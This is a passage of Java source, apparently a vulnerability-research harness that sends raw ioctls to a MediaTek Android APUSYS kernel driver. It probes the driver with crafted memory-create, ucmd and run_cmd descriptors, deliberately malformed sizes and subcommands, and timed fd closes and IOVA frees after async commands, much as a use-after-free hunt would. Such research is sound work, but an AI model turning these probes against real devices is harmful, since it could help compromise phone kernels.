        DrmTrigger.unsafePutInt(devCtrl + 0x04, coreId);
        DrmTrigger.unsafePutInt(devCtrl + 0x08, control);

        String name = "devctl_" + provider + "_c" + coreId
            + "_ctrl" + Integer.toHexString(control);
        return ioctlAndPrint(fd, name, APUSYS_CMD_DEV_CTRL, devCtrl);
    }

    private static void runMemDmabuf(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS dmabuf memory-create tests ===");
        System.out.println("[*] Mode: create DRM dumb buffer, export PRIME fd,"
            + " import through APUSYS type2/type3 descriptors");

        int drmFd = -1;
        int dmaBufFd = -1;
        int handle = 0;
        try {
            drmFd = DrmTrigger.openDev("/dev/dri/card0");
            System.out.println("[+] Opened /dev/dri/card0 fd=" + drmFd);

            long create = DrmTrigger.sScratchBuf + OFF_DRM_CREATE;
            DrmTrigger.zeroMem(create, 0x20);
            DrmTrigger.unsafePutInt(create + 0x00, 64);  // height
            DrmTrigger.unsafePutInt(create + 0x04, 64);  // width
            DrmTrigger.unsafePutInt(create + 0x08, 32);  // bpp
            long ret = DrmTrigger.rawIoctl(drmFd, DrmTrigger.DRM_IOCTL_MODE_CREATE_DUMB, create);
            System.out.println("[*] drm_create_dumb   cmd=0x"
                + Long.toHexString(DrmTrigger.DRM_IOCTL_MODE_CREATE_DUMB)
                + " ret=" + retText(ret));
            if (ret < 0) {
                return;
            }

            handle = DrmTrigger.unsafeGetInt(create + 0x10);
            int pitch = DrmTrigger.unsafeGetInt(create + 0x14);
            long size = DrmTrigger.unsafeGetLong(create + 0x18);
            System.out.println("    dumb: handle=" + handle + " pitch=" + pitch
                + " size=0x" + Long.toHexString(size));

            long prime = DrmTrigger.sScratchBuf + OFF_DRM_PRIME;
            DrmTrigger.zeroMem(prime, 0x10);
            DrmTrigger.unsafePutInt(prime + 0x00, handle);
            DrmTrigger.unsafePutInt(prime + 0x04, 0);  // flags
            ret = DrmTrigger.rawIoctl(drmFd, DRM_IOCTL_PRIME_HANDLE_TO_FD, prime);
            System.out.println("[*] drm_prime_to_fd   cmd=0x"
                + Long.toHexString(DRM_IOCTL_PRIME_HANDLE_TO_FD)
                + " ret=" + retText(ret));
            if (ret < 0) {
                return;
            }

            dmaBufFd = DrmTrigger.unsafeGetInt(prime + 0x08);
            System.out.println("    dmabuf fd=" + dmaBufFd);

            runMemCreateWithFd(apusysFd, "mem_create2_dmabuf",
                APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, dmaBufFd, size);
            runMemCreateWithFd(apusysFd, "mem_create3_dmabuf",
                APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, dmaBufFd, size);
        } finally {
            if (dmaBufFd >= 0) {
                DrmTrigger.closeFd(dmaBufFd);
            }
            if (drmFd >= 0 && handle != 0) {
                long destroy = DrmTrigger.sScratchBuf + OFF_DRM_DESTROY;
                DrmTrigger.zeroMem(destroy, 0x08);
                DrmTrigger.unsafePutInt(destroy + 0x00, handle);
                long ret = DrmTrigger.rawIoctl(drmFd, DrmTrigger.DRM_IOCTL_MODE_DESTROY_DUMB, destroy);
                System.out.println("[*] drm_destroy_dumb cmd=0x"
                    + Long.toHexString(DrmTrigger.DRM_IOCTL_MODE_DESTROY_DUMB)
                    + " ret=" + retText(ret));
            }
            if (drmFd >= 0) {
                DrmTrigger.closeFd(drmFd);
            }
        }
    }

    private static void runMemIon(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS ION memory-create tests ===");
        System.out.println("[*] Mode: allocate old-ION buffer, share dmabuf fd,"
            + " import through APUSYS type2/type3 descriptors");

        int ionFd = -1;
        int dmaBufFd = -1;
        int handle = 0;
        int heapMask = 0;
        int[] heapMasks = {0x4, 0x1, 0x2, 0x8, 0x10, 0x20, 0x40, 0x100};
        try {
            try {
                ionFd = DrmTrigger.openDev("/dev/ion");
            } catch (RuntimeException e) {
                System.out.println("[-] open /dev/ion failed: " + e.getMessage());
                return;
            }
            System.out.println("[+] Opened /dev/ion fd=" + ionFd);

            for (int i = 0; i < heapMasks.length; i++) {
                int candidate = heapMasks[i];
                handle = ionAlloc(ionFd, candidate, 0x4000);
                if (handle != 0) {
                    heapMask = candidate;
                    break;
                }
            }

            if (handle == 0) {
                System.out.println("[-] ION allocation failed for all tested heap masks");
                return;
            }

            dmaBufFd = ionShare(ionFd, handle);
            if (dmaBufFd < 0) {
                return;
            }

            System.out.println("    ion: heap_mask=0x" + Integer.toHexString(heapMask)
                + " handle=" + handle + " dmabuf_fd=" + dmaBufFd);
            runMemCreateWithFd(apusysFd, "mem_create2_ion",
                APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, dmaBufFd, 0x4000);
            runMemCreateWithFd(apusysFd, "mem_create3_ion",
                APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, dmaBufFd, 0x4000);
        } finally {
            if (dmaBufFd >= 0) {
                DrmTrigger.closeFd(dmaBufFd);
            }
            if (ionFd >= 0 && handle != 0) {
                ionFree(ionFd, handle);
            }
            if (ionFd >= 0) {
                DrmTrigger.closeFd(ionFd);
            }
        }
    }

    private static void runFdScan(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS fd-source scan ===");
        System.out.println("[*] Mode: open candidate fds and feed memory-create only;"
            + " no ucmd execution");

        String[] candidates = {
            "/dev/dma_heap/system",
            "/dev/dma_heap/system-uncached",
            "/dev/dma_heap/mtk_mm",
            "/dev/dma_heap/mtk_mm-uncached",
            "/dev/dri/card0",
            "/dev/mali0",
            "/dev/ashmem",
            "/dev/zero",
            "/dev/null",
            "/dev/apusys",
            "/dev/ion"
        };

        for (int i = 0; i < candidates.length; i++) {
            String path = candidates[i];
            int fd = -1;
            String label = fdLabel(path);
            try {
                try {
                    fd = DrmTrigger.openDev(path);
                    System.out.println("[+] fdscan_open_" + label + " fd=" + fd);
                } catch (RuntimeException e) {
                    System.out.println("[-] fdscan_open_" + label + " failed: "
                        + e.getMessage());
                    continue;
                }

                runMemCreateWithFd(apusysFd, "fdscan2_" + label,
                    APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, fd, 0x1000);
                runMemCreateWithFd(apusysFd, "fdscan3_" + label,
                    APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, fd, 0x1000);
            } finally {
                if (fd >= 0) {
                    DrmTrigger.closeFd(fd);
                }
            }
        }
    }

    private static void runUcmdNegative(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS ucmd negative tests ===");
        System.out.println("[*] Mode: normal VPU device id 3, core 0/1,"
            + " bad fd, offset 0, nonzero length");

        runUcmdWithFd(apusysFd, "ucmd_vpu_c0_badfd", 3, 0, -1, 0, 0x1000);
        runUcmdWithFd(apusysFd, "ucmd_vpu_c1_badfd", 3, 1, -1, 0, 0x1000);
    }

    private static long runUcmdWithFd(int apusysFd, String name, int devId,
                                      int coreId, int fd, int offset, int length)
            throws Exception {
        long ucmd = DrmTrigger.sScratchBuf + OFF_UCMD;
        DrmTrigger.zeroMem(ucmd, 0x14);
        DrmTrigger.unsafePutInt(ucmd + 0x00, devId);
        DrmTrigger.unsafePutInt(ucmd + 0x04, coreId);
        DrmTrigger.unsafePutInt(ucmd + 0x08, fd);
        DrmTrigger.unsafePutInt(ucmd + 0x0c, offset);
        DrmTrigger.unsafePutInt(ucmd + 0x10, length);
        return ioctlAndPrint(apusysFd, name, APUSYS_CMD_UCMD, ucmd);
    }

    private static void runHardwareBufferProbe(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional HardwareBuffer dmabuf probe ===");
        System.out.println("[*] Mode: allocate HardwareBuffer, inspect fd-bearing Parcel,"
            + " import discovered fds through APUSYS memory-create only");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.os.HwBinder");
        dumpClassShape("android.os.HwParcel");
        dumpClassShape("android.os.NativeHandle");
        dumpClassShape("android.hardware.common.NativeHandle");
        dumpClassShape("android.hardware.graphics.common.HardwareBuffer");
        dumpClassShape("android.hardware.graphics.allocator.V4_0.IAllocator");

        android.hardware.HardwareBuffer hb = null;
        try {
            long usage = android.hardware.HardwareBuffer.USAGE_CPU_READ_OFTEN
                | android.hardware.HardwareBuffer.USAGE_CPU_WRITE_OFTEN
                | android.hardware.HardwareBuffer.USAGE_GPU_SAMPLED_IMAGE;
            hb = android.hardware.HardwareBuffer.create(
                64, 64, android.hardware.HardwareBuffer.RGBA_8888, 1, usage);
            System.out.println("[+] HardwareBuffer created:"
                + " id=" + optionalLongMethod(hb, "getId")
                + " width=" + optionalIntMethod(hb, "getWidth")
                + " height=" + optionalIntMethod(hb, "getHeight")
                + " format=" + optionalIntMethod(hb, "getFormat")
                + " layers=" + optionalIntMethod(hb, "getLayers")
                + " usage=" + optionalLongMethod(hb, "getUsage"));

            probeHardwareBufferParcel(apusysFd, hb, false, false, "hwb");
        } catch (Throwable t) {
            System.out.println("[-] HardwareBuffer probe failed: " + shortThrowable(t));
        } finally {
            if (hb != null) {
                hb.close();
            }
        }
    }

    private static void runUcmdHardwareBufferProbe(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS ucmd HardwareBuffer gate probe ===");
        System.out.println("[*] Mode: write first u32 through ImageWriter,"
            + " import HardwareBuffer fd, then call normal VPU ucmd core 0/1");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneUcmdHardwareBufferProbe(apusysFd, "zero", 0);
        runOneUcmdHardwareBufferProbe(apusysFd, "gate8001", 0x8001);
    }

    private static void runUcmdKeyHardwareBufferProbe(int apusysFd, String key)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS ucmd key lookup probe ===");
        System.out.println("[*] Mode: emulate libvpu.so getAlgo payload:"
            + " first_u32=0x8001, key at +4, then normal VPU ucmd core 0/1");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneUcmdHardwareBufferProbe(apusysFd,
            "key_" + sanitizeLabel(key), 0x8001, key);
    }

    private static void runUcmdKeyDumpHardwareBufferProbe(int apusysFd, String key)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS ucmd key lookup dump probe ===");
        System.out.println("[*] Mode: same as --ucmd-key, plus Image plane"
            + " payload dump before/after each ucmd ioctl");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneUcmdHardwareBufferProbe(apusysFd,
            "keydump_" + sanitizeLabel(key), 0x8001, key, true);
    }

    private static void runOneUcmdHardwareBufferProbe(int apusysFd, String label,
                                                      int firstU32) throws Exception {
        runOneUcmdHardwareBufferProbe(apusysFd, label, firstU32, null);
    }

    private static void runOneUcmdHardwareBufferProbe(int apusysFd, String label,
                                                      int firstU32, String key)
            throws Exception {
        runOneUcmdHardwareBufferProbe(apusysFd, label, firstU32, key, false);
    }

    private static void runOneUcmdHardwareBufferProbe(int apusysFd, String label,
                                                      int firstU32, String key,
                                                      boolean dumpPayload)
            throws Exception {
        System.out.println("\n[*] --- ucmd HardwareBuffer case: " + label
            + " first_u32=0x" + Integer.toHexString(firstU32)
            + (key == null ? "" : " key=\"" + key + "\"")
            + " ---");

        android.media.ImageReader reader = null;
        android.media.ImageWriter writer = null;
        android.media.Image input = null;
        android.media.Image output = null;
        android.hardware.HardwareBuffer hb = null;
        try {
            reader = createRgbaImageReader(64, 64);
            System.out.println("[+] ImageReader created: width=" + reader.getWidth()
                + " height=" + reader.getHeight()
                + " format=" + reader.getImageFormat()
                + " hbFormat=" + reader.getHardwareBufferFormat()
                + " usage=0x" + Long.toHexString(reader.getUsage()));

            writer = android.media.ImageWriter.newInstance(reader.getSurface(), 2);
            System.out.println("[+] ImageWriter created: width=" + writer.getWidth()
                + " height=" + writer.getHeight()
                + " format=" + writer.getFormat()
                + " hbFormat=" + writer.getHardwareBufferFormat()
                + " usage=0x" + Long.toHexString(writer.getUsage()));

            input = writer.dequeueInputImage();
            fillImageHeader(input, firstU32, key);
            writer.queueInputImage(input);
            input = null;

            output = acquireImage(reader);
            if (output == null) {
                System.out.println("[-] ImageReader did not produce an output image");
                return;
            }

            hb = output.getHardwareBuffer();
            if (hb == null) {
                System.out.println("[-] Image.getHardwareBuffer returned null");
                return;
            }

            System.out.println("[+] Output HardwareBuffer:"
                + " width=" + optionalIntMethod(hb, "getWidth")
                + " height=" + optionalIntMethod(hb, "getHeight")
                + " format=" + optionalIntMethod(hb, "getFormat")
                + " layers=" + optionalIntMethod(hb, "getLayers")
                + " usage=" + optionalLongMethod(hb, "getUsage"));
            probeHardwareBufferParcel(apusysFd, hb, true, false,
                "hwb_" + label, dumpPayload ? output : null);
        } catch (Throwable t) {
            System.out.println("[-] ucmd HardwareBuffer case " + label
                + " failed: " + shortThrowable(t));
        } finally {
            if (hb != null) {
                hb.close();
            }
            if (output != null) {
                output.close();
            }
            if (input != null) {
                input.close();
            }
            if (writer != null) {
                writer.close();
            }
            if (reader != null) {
                reader.close();
            }
        }
    }

    private static void runRunCmdHardwareBufferProbe(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd HardwareBuffer parser probe ===");
        System.out.println("[*] Mode: write zero header through ImageWriter,"
            + " import HardwareBuffer fd, then call run_cmd_async only");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneRunCmdHardwareBufferProbe(apusysFd, "zero", 0);
    }

    private static void runRunCmdInvalidScHardwareBufferProbe(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd invalid-subcommand parser probe ===");
        System.out.println("[*] Mode: valid APUSYS command header, one invalid"
            + " subcommand type, no provider request");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneRunCmdHardwareBufferProbe(apusysFd, "invalid_sc_type20", 0,
            RUN_CMD_PAYLOAD_INVALID_SC);
    }

    private static void runRunCmdVpuGuardHardwareBufferProbe(int apusysFd)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd VPU request-guard probe ===");
        System.out.println("[*] Mode: valid APUSYS command header, normal VPU"
            + " subcommand type, intentionally short codebuf size, no VPU execute");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneRunCmdHardwareBufferProbe(apusysFd, "vpu_guard_size20", 0,
            RUN_CMD_PAYLOAD_VPU_GUARD);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, 3000);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, false);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, VPU_DESC_MINIMAL);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            XRP_CMD_FLAGS_INITIAL);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, VPU_DESC_ORDER_CODE_OUTPUT);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, XRP_SETTINGS_LEN);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen,
            XRP_OUTPUT_HEADER_FLAG_DEFAULT);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            XrpSettingsShape.CURRENT);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, false);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, VPU_REQUEST_FLAGS_DEFAULT);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, requestFlags, true);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags,
                                                            boolean includeSettingsProperty)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, requestFlags, includeSettingsProperty,
            null, null, null, null, null, null, null, null);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags,
                                                            boolean includeSettingsProperty,
                                                            Integer codeFirstWordOverride)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, requestFlags, includeSettingsProperty,
            codeFirstWordOverride, null, null, null, null, null, null, null);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags,
                                                            boolean includeSettingsProperty,
                                                            Integer codeFirstWordOverride,
                                                            Integer descriptorPayloadSizeOverride,
                                                            Integer requestPriorityOverride,
                                                            Integer requestBufferCountOverride,
                                                            Integer descriptorPortIdOverride,
                                                            Integer descriptorFormatOverride,
                                                            Integer descriptorPlaneCountOverride,
                                                            Integer descriptorHeightOverride)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, requestFlags, includeSettingsProperty,
            codeFirstWordOverride, descriptorPayloadSizeOverride,
            requestPriorityOverride, requestBufferCountOverride,
            descriptorPortIdOverride, descriptorFormatOverride,
            descriptorPlaneCountOverride, descriptorHeightOverride, null, null,
            null);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags,
                                                            boolean includeSettingsProperty,
                                                            Integer codeFirstWordOverride,
                                                            Integer descriptorPayloadSizeOverride,
                                                            Integer requestPriorityOverride,
                                                            Integer requestBufferCountOverride,
                                                            Integer descriptorPortIdOverride,
                                                            Integer descriptorFormatOverride,
                                                            Integer descriptorPlaneCountOverride,
                                                            Integer descriptorHeightOverride,
                                                            Integer outerCodebufSizeOverride,
                                                            Integer dataPayloadWordBaseOverride,
                                                            XrpDataDescEntry[] dataDescEntriesOverride)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, requestFlags, includeSettingsProperty,
            codeFirstWordOverride, descriptorPayloadSizeOverride,
            requestPriorityOverride, requestBufferCountOverride,
            descriptorPortIdOverride, descriptorFormatOverride,
            descriptorPlaneCountOverride, descriptorHeightOverride,
            outerCodebufSizeOverride, dataPayloadWordBaseOverride,
            dataDescEntriesOverride, false);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags,
                                                            boolean includeSettingsProperty,
                                                            Integer codeFirstWordOverride,
                                                            Integer descriptorPayloadSizeOverride,
                                                            Integer requestPriorityOverride,
                                                            Integer requestBufferCountOverride,
                                                            Integer descriptorPortIdOverride,
                                                            Integer descriptorFormatOverride,
                                                            Integer descriptorPlaneCountOverride,
                                                            Integer descriptorHeightOverride,
                                                            Integer outerCodebufSizeOverride,
                                                            Integer dataPayloadWordBaseOverride,
                                                            XrpDataDescEntry[] dataDescEntriesOverride,
                                                            boolean fullCommandCopybackDiff)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, requestFlags, includeSettingsProperty,
            codeFirstWordOverride, descriptorPayloadSizeOverride,
            requestPriorityOverride, requestBufferCountOverride,
            descriptorPortIdOverride, descriptorFormatOverride,
            descriptorPlaneCountOverride, descriptorHeightOverride,
            outerCodebufSizeOverride, dataPayloadWordBaseOverride,
            dataDescEntriesOverride, fullCommandCopybackDiff, null, null);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
                                                            int outputHeaderFlag,
                                                            XrpSettingsShape settingsShape,
                                                            boolean waitAfterAsync,
                                                            int requestFlags,
                                                            boolean includeSettingsProperty,
                                                            Integer codeFirstWordOverride,
                                                            Integer descriptorPayloadSizeOverride,
                                                            Integer requestPriorityOverride,
                                                            Integer requestBufferCountOverride,
                                                            Integer descriptorPortIdOverride,
                                                            Integer descriptorFormatOverride,
                                                            Integer descriptorPlaneCountOverride,
                                                            Integer descriptorHeightOverride,
                                                            Integer outerCodebufSizeOverride,
                                                            Integer dataPayloadWordBaseOverride,
                                                            XrpDataDescEntry[] dataDescEntriesOverride,
                                                            boolean fullCommandCopybackDiff,
                                                            Integer closeApusysFdAfterAsyncMs,
                                                            Integer freeSharedIovaAfterAsyncMs)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, twoVpuBuffers, descriptorMode,
            cmdFlags, descriptorOrder, settingsLen, outputHeaderFlag,
            settingsShape, waitAfterAsync, requestFlags, includeSettingsProperty,
            codeFirstWordOverride, descriptorPayloadSizeOverride,
            requestPriorityOverride, requestBufferCountOverride,
            descriptorPortIdOverride, descriptorFormatOverride,
            descriptorPlaneCountOverride, descriptorHeightOverride,
            outerCodebufSizeOverride, dataPayloadWordBaseOverride,
            dataDescEntriesOverride, fullCommandCopybackDiff,
            closeApusysFdAfterAsyncMs, freeSharedIovaAfterAsyncMs, 0, null,
            null);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers,
                                                            int descriptorMode,
                                                            int cmdFlags,
                                                            int descriptorOrder,
                                                            int settingsLen,
